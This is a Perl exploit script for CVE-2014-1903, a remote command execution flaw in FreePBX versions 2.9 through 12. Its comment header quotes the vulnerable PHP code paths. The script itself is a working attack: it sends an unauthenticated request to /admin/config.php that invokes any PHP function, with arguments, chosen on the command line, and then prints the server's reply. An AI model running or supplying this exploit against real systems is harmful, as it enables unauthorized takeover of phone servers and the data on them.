#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

# Exploit Title: FreePBX 2.9,2.10,2.11,12 Remote Command Execution
# Google Dork: n/a
# Date: 2/25/14
# Exploit Author: @0x00string
# Vendor Homepage: http://www.freepbx.org/
# Software Link: http://mirror.freepbx.org/freepbx-2.11.0.tar.gz
# Version: 2.11 tested working
# Tested on: Ubuntu 12.04, 13.10
# CVE : CVE-2014-1903


#	References:
#	http://seclists.org/bugtraq/2014/Feb/42
#	http://issues.freepbx.org/browse/FREEPBX-7123
#	http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-1903
#
#	Developer Advisory:
#	http://www.freepbx.org/news/2014-02-06/security-vulnerability-notice



# in /admin/config.php
#	// handle special requests
#	if (!isset($no_auth) && isset($_REQUEST['handler'])) {
#		$module = isset($_REQUEST['module'])	? $_REQUEST['module']	: '';
#		$file 	= isset($_REQUEST['file'])		? $_REQUEST['file']		: '';
#		fileRequestHandler($_REQUEST['handler'], $module, $file);
#		exit();
#	}


# in /admin/library/view.functions.php
#	    case 'api':
#	      if (isset($_REQUEST['function']) && function_exists($_REQUEST['function'])) {
#	        $function = $_REQUEST['function'];
#	        $args = isset($_REQUEST['args'])?$_REQUEST['args']:'';
#	
#	        //currently works for one arg functions, eventually need to clean this up to except more args
#	        $result = $function($args);
#	        $jr = json_encode($result);
#	      } else {
#	        $jr = json_encode(null);
#	      }
#	      header("Content-type: application/json");
#	      echo $jr;
#	    break;


$| = 1;

my $sock = new IO::Socket::INET (
    PeerHost => $ARGV[0],
    PeerPort => '80',
    Proto => 'tcp',
);
die "$!\n" unless $sock;
my $func = $ARGV[1];
my $args = "";
my $i = 0;
my $max = 1;
foreach(@ARGV) {
	if ($i > 1) {
		$args .= $_;
	}
	unless($i > (scalar(@ARGV) - 2)) {
		$args .= "%20";
	}
	$i++;
}
my $payload = "display=A&handler=api&file=A&module=A&function=" . $func . "&args=" . $args;
chomp($payload);
print "payload is " . $payload . "\n";
my $packet = 	"GET http://" . $ARGV[0] . "/admin/config.php?" . $payload . "\r\n\r\n";
my $size = $sock->send($packet);
shutdown($sock, 1);
my $resp;
$sock->recv($resp, 1024);
print $resp . "\n";
$sock->close();
exit(0);